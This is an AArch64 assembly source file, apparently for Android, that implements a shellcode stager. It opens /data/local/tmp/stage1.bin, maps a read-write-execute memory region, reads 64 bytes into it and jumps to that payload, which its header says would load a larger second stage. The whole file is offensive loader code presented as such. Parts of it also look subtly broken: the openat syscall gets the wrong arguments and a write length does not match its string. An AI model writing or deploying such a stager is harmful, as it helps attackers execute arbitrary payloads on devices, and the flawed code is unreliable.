/*
 * multistage_shellcode_stager.s - Multistage Shellcode Stager
 *
 * This user-mode stager opens "/data/local/tmp/stage1.bin", allocates a 64-byte RWX region via mmap,
 * reads 64 bytes into it, then branches to the loaded payload. That initial stage would then load a
 * secondary, larger payload.
 */
 
.section .data
file_path:
    .asciz "/data/local/tmp/stage1.bin\0"
msg_fail:
    .asciz "Stage1 load failed\n"

.section .text
.global main
main:
    /* Open the stage1 file (O_RDONLY = 0) */
    adr x0, file_path
    mov x1, #0
    mov x8, #56         // open syscall
    svc 0
    cmp x0, #0
    blt stage1_fail
    mov x19, x0         /* File descriptor */

    /* Allocate 64 bytes of RWX memory */
    mov x0, 0
    mov x1, #64
    mov x2, #7          /* PROT_READ|PROT_WRITE|PROT_EXEC */
    mov x3, #0x22
    mov x4, #-1
    mov x5, 0
    mov x8, #222
    svc 0
    mov x20, x0         /* Pointer to allocated memory */

    /* Read 64 bytes from stage1.bin into allocated memory */
    mov x0, x19
    mov x1, x20
    mov x2, #64
    mov x8, #63         // read syscall
    svc 0

    /* Close the file descriptor */
    mov x0, x19
    mov x8, #57         // close syscall
    svc 0

    /* Transfer control to the loaded payload */
    mov x0, x20
    br x0

stage1_fail:
    mov x0, #1
    adr x1, msg_fail
    mov x2, #21
    mov x8, #64
    svc 0
    mov x0, #1
    mov x8, #93
    svc 0
